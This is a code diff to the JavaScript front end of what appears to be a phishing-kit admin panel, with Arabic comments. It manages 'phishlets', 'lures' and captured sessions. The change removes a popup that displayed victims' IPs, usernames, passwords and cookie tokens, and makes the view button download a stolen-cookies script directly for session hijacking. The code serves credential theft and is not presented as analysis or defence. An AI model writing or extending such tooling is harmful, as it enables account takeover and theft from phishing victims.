@@ -925,139 +925,24 @@ function populateSessionsTable(sessions) {
     viewButtons.forEach(button => {
         button.addEventListener('click', async function() {
             const id = this.dataset.id;
-            await showSessionDetails(id);
+            // إضافة معرف الجلسة إلى زر التنزيل وإستدعاء دالة تنزيل الكوكيز مباشرة
+            const downloadBtn = document.getElementById('download-cookies-btn');
+            downloadBtn.dataset.sessionId = id;
+            
+            // تنزيل الكوكيز مباشرة بدلاً من عرض النافذة المنبثقة
+            try {
+                // الحصول على تفاصيل الجلسة أولاً للحصول على الكوكيز
+                const sessionData = await fetchSessionDetails(id);
+                console.log('Session data for cookies:', sessionData);
+                
+                // استدعاء دالة تنزيل الكوكيز
+                downloadCookiesScript();
+            } catch (error) {
+                console.error('Error fetching session details:', error);
+                showToast('خطأ', 'فشل في تحميل تفاصيل الجلسة', 'error');
+            }
         });
     });
-}
-
-// Show session details
-async function showSessionDetails(id) {
-    // Create the popup window
-    const sessionModal = document.getElementById('session-view-modal');
-    sessionModal.style.display = 'block';
-    
-    const sessionIdValue = document.getElementById('session-id-value');
-    const sessionPhishletValue = document.getElementById('session-phishlet-value');
-    const sessionIpValue = document.getElementById('session-ip-value');
-    const sessionUaValue = document.getElementById('session-ua-value');
-    const sessionUsernameValue = document.getElementById('session-username-value');
-    const sessionPasswordValue = document.getElementById('session-password-value');
-    const sessionCreatedValue = document.getElementById('session-created-value');
-    const sessionUpdatedValue = document.getElementById('session-updated-value');
-    const sessionLandingValue = document.getElementById('session-landing-value');
-    
-    // Show loading indicator
-    sessionIdValue.textContent = 'Loading...';
-    
-    try {
-        const sessionData = await fetchSessionDetails(id);
-        
-        console.log('Session data:', sessionData);
-        
-        // Populate session data
-        sessionIdValue.textContent = id;
-        sessionPhishletValue.textContent = sessionData.phishlet || 'Unknown';
-        sessionIpValue.textContent = sessionData.remote_addr || 'Unknown';
-        sessionUaValue.textContent = sessionData.useragent || 'Unknown';
-        sessionUsernameValue.textContent = sessionData.username || 'Not logged in';
-        sessionPasswordValue.textContent = sessionData.password || 'Not logged in';
-        sessionCreatedValue.textContent = formatDate(sessionData.create_time * 1000);
-        sessionUpdatedValue.textContent = formatDate(sessionData.update_time * 1000);
-        sessionLandingValue.textContent = sessionData.landing_url || 'Unknown';
-        
-        // Populate cookies table
-        const cookiesTable = document.getElementById('cookies-table').querySelector('tbody');
-        cookiesTable.innerHTML = '';
-        
-        // الكشف عن الكوكيز وتنسيقها للعرض
-        let hasAnyCookies = false;
-        
-        // التحقق من وجود الكوكيز في أي من الحقول المحتملة
-        const cookieTokens = sessionData.cookie_tokens || sessionData.CookieTokens || sessionData.tokens || {};
-
-        if (cookieTokens && Object.keys(cookieTokens).length > 0) {
-            for (const domain in cookieTokens) {
-                const domainCookies = cookieTokens[domain];
-                
-                for (const cookieName in domainCookies) {
-                    hasAnyCookies = true;
-                    const cookie = domainCookies[cookieName];
-                    
-                    // التحقق من نوع البيانات وتنسيقها بشكل صحيح
-                    let cookieValue = '';
-                    if (typeof cookie === 'string') {
-                        cookieValue = cookie;
-                    } else if (cookie && typeof cookie === 'object') {
-                        cookieValue = cookie.value || cookie.Value || JSON.stringify(cookie);
-                    }
-                    
-                    const row = document.createElement('tr');
-                    row.innerHTML = `
-                        <td>${domain}</td>
-                        <td>${cookieName}</td>
-                        <td>${cookieValue}</td>
-                    `;
-                    cookiesTable.appendChild(row);
-                }
-            }
-        }
-        
-        if (!hasAnyCookies) {
-            cookiesTable.innerHTML = '<tr><td colspan="3" class="text-center">No cookies available</td></tr>';
-        }
-        
-        // Populate params table
-        const paramsTable = document.getElementById('params-table').querySelector('tbody');
-        paramsTable.innerHTML = '';
-        
-        if (sessionData.params && Object.keys(sessionData.params).length > 0) {
-            for (const paramName in sessionData.params) {
-                const paramValue = sessionData.params[paramName];
-                
-                const row = document.createElement('tr');
-                row.innerHTML = `
-                    <td>${paramName}</td>
-                    <td>${paramValue}</td>
-                `;
-                paramsTable.appendChild(row);
-            }
-        } else {
-            paramsTable.innerHTML = '<tr><td colspan="2" class="text-center">No parameters available</td></tr>';
-        }
-        
-        // تحديث زر تنزيل الكوكيز
-        const downloadCookiesBtn = document.getElementById('download-cookies-btn');
-        downloadCookiesBtn.dataset.sessionId = id;
-        downloadCookiesBtn.style.display = hasAnyCookies ? 'inline-flex' : 'none';
-        
-        // Handle session delete event
-        document.getElementById('session-delete-btn').onclick = async function() {
-            if (confirm('Are you sure you want to delete this session?')) {
-                try {
-                    const response = await fetch(`/api/sessions/${id}`, {
-                        method: 'DELETE',
-                        headers: getHeaders()
-                    });
-                    
-                    if (response.ok) {
-                        showToast('Success', 'Session deleted successfully', 'success');
-                        sessionModal.style.display = 'none';
-                        fetchSessions().then(populateSessionsTable);
-                    } else {
-                        showToast('Error', 'Failed to delete session', 'error');
-                    }
-                } catch (error) {
-                    console.error('Error deleting session:', error);
-                    showToast('Error', 'Failed to delete session', 'error');
-                }
-            }
-        };
-        
-    } catch (error) {
-        console.error('Error fetching session details:', error);
-        sessionIdValue.textContent = 'Error loading';
-        showToast('Error', 'Failed to load session details', 'error');
-    }
 }
 
 // Show new Lure modal
